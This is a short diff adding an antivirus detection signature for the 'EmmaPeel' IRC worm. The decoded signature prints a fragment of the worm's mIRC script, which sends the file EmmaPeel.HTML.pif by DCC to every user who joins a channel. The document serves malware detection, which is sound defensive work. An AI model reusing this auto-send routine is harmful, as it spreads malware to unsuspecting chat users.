@@ -1,0 +1,8 @@
+VIRUS NAME: Win.Worm.EmmaPeel-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+TML.pif
+n6 =on 1:JOIN:#:{
+n7 =if ( $nick == $me ) { halt } | .dcc send $nick C:\Windows\EmmaPeel.HTML.pif
+n
